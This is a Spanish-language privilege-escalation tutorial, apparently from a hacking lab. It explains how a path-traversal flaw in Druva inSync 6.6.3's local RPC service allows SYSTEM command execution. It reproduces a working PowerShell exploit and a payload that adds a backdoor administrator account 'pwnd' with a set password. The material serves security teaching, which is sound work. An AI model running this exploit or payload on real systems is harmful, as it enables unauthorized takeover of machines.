# Abusing vulnerable software

### Unpatched Software

El software instalado en el sistema de destino puede presentar varias oportunidades de escalada de privilegios. Al igual que con los controladores, es posible que las organizaciones y los usuarios no los actualicen con tanta frecuencia como actualizan el sistema operativo. Puede utilizar la `wmic` herramienta para enumerar el software instalado en el sistema de destino y sus versiones. El siguiente comando volcará la información que puede recopilar sobre el software instalado (puede tardar alrededor de un minuto en finalizar):

```shell-session
wmic product get name,version,vendor
```

Recuerde que es posible que el `wmic product` comando no devuelva todos los programas instalados. Dependiendo de cómo se instalaron algunos de los programas, es posible que no aparezcan aquí. Siempre conviene comprobar los accesos directos del escritorio, los servicios disponibles o en general cualquier rastro que indique la existencia de software adicional que pueda resultar vulnerable.

Una vez que hayamos recopilado información sobre la versión del producto, siempre podremos buscar exploits existentes en el software instalado en línea en sitios como [exploit-db](https://www.exploit-db.com/) , [pack storm](https://packetstormsecurity.com/) o el antiguo [Google](https://www.google.com/) , entre muchos otros.

Usando wmic y Google, ¿puedes encontrar una vulnerabilidad conocida en algún producto instalado?

### Case Study: Druva inSync 6.6.3

El servidor de destino ejecuta Druva inSync 6.6.3, que es vulnerable a la escalada de privilegios, según informó [Matteo Malvica](https://www.matteomalvica.com/blog/2020/05/21/lpe-path-traversal/) . La vulnerabilidad es el resultado de un parche incorrecto aplicado sobre otra vulnerabilidad reportada inicialmente para la versión 6.5.0 por [Chris Lyne](https://www.tenable.com/security/research/tra-2020-12) .

El software es vulnerable porque ejecuta un servidor RPC (llamada a procedimiento remoto) en el puerto 6064 con privilegios de SISTEMA, al que se puede acceder únicamente desde localhost. Si no está familiarizado con RPC, es simplemente un mecanismo que permite que un proceso determinado exponga funciones (llamadas procedimientos en la jerga de RPC) a través de la red para que otras máquinas puedan llamarlas de forma remota.

En el caso de Druva inSync, uno de los procedimientos expuestos (específicamente el procedimiento número 5) en el puerto 6064 permitía a cualquiera solicitar la ejecución de cualquier comando. Dado que el servidor RPC se ejecuta como SISTEMA, cualquier comando se ejecuta con privilegios de SISTEMA.

La vulnerabilidad original reportada en las versiones 6.5.0 y anteriores permitía ejecutar cualquier comando sin restricciones. La idea original detrás de proporcionar dicha funcionalidad era ejecutar de forma remota algunos archivos binarios específicos proporcionados con inSync, en lugar de cualquier comando. Aún así, no se realizó ninguna verificación para asegurarlo.

Se emitió un parche, donde decidieron verificar que el comando ejecutado comenzara con la cadena `C:\ProgramData\Druva\inSync4\`, donde se suponía que estaban los binarios permitidos. Pero claro, esto resultó insuficiente ya que simplemente se podía realizar un ataque de recorrido de ruta para evitar este tipo de control. Supongamos que desea ejecutar `C:\Windows\System32\cmd.exe`, que no está en la ruta permitida; simplemente puede pedirle al servidor que se ejecute `C:\ProgramData\Druva\inSync4\..\..\..\Windows\System32\cmd.exe`y eso omitirá la verificación con éxito.

Para crear un exploit que funcione, debemos entender cómo hablar con el puerto 6064. Afortunadamente para nosotros, el protocolo en uso es sencillo y los paquetes que se enviarán se muestran en el siguiente diagrama:

<figure><img src="../../.gitbook/assets/20231009174335.png" alt=""><figcaption></figcaption></figure>

El primer paquete es simplemente un paquete de saludo que contiene una cadena fija. El segundo paquete indica que queremos ejecutar el procedimiento número 5, ya que este es el procedimiento vulnerable que ejecutará cualquier comando por nosotros. Los dos últimos paquetes se utilizan para enviar la longitud del comando y la cadena de comando que se ejecutará, respectivamente.

Publicado inicialmente por Matteo Malvica [aquí](https://packetstormsecurity.com/files/160404/Druva-inSync-Windows-Client-6.6.3-Privilege-Escalation.html) , el siguiente exploit se puede utilizar en su máquina de destino para elevar los privilegios y recuperar el indicador de esta tarea. Para su comodidad, aquí está el código del exploit original:

```powershell
$ErrorActionPreference = "Stop"

$cmd = "net user pwnd /add"

$s = New-Object System.Net.Sockets.Socket(
    [System.Net.Sockets.AddressFamily]::InterNetwork,
    [System.Net.Sockets.SocketType]::Stream,
    [System.Net.Sockets.ProtocolType]::Tcp
)
$s.Connect("127.0.0.1", 6064)

$header = [System.Text.Encoding]::UTF8.GetBytes("inSync PHC RPCW[v0002]")
$rpcType = [System.Text.Encoding]::UTF8.GetBytes("$([char]0x0005)`0`0`0")
$command = [System.Text.Encoding]::Unicode.GetBytes("C:\ProgramData\Druva\inSync4\..\..\..\Windows\System32\cmd.exe /c $cmd");
$length = [System.BitConverter]::GetBytes($command.Length);

$s.Send($header)
$s.Send($rpcType)
$s.Send($length)
$s.Send($command)
```

Puede abrir una consola Powershell y pegar el exploit directamente para ejecutarlo (el exploit también está disponible en la máquina de destino en `C:\tools\Druva_inSync_exploit.txt`). Tenga en cuenta que la carga útil predeterminada del exploit, especificada en la `$cmd`variable, creará un usuario nombrado `pwnd`en el sistema, pero no le asignará privilegios administrativos, por lo que probablemente querremos cambiar la carga útil por algo más útil. Para esta sala, cambiaremos la carga útil para ejecutar el siguiente comando:

```powershell
net user pwnd SimplePass123 /add & net localgroup administrators pwnd /add
```

Esto creará un usuario `pwnd`con una contraseña `SimplePass123`y lo agregará al grupo de administradores. Si el exploit tuvo éxito, debería poder ejecutar el siguiente comando para verificar que el usuario `pwnd`existe y es parte del grupo de administradores:

Símbolo del sistema

```shell-session
PS C:\> net user pwnd
User name                    pwnd
Full Name
Account active               Yes
[...]

Local Group Memberships      *Administrators       *Users
Global Group memberships     *None
```

Como último paso, puedes ejecutar un símbolo del sistema como administrador:

<figure><img src="../../.gitbook/assets/20231009174402.png" alt=""><figcaption></figcaption></figure>
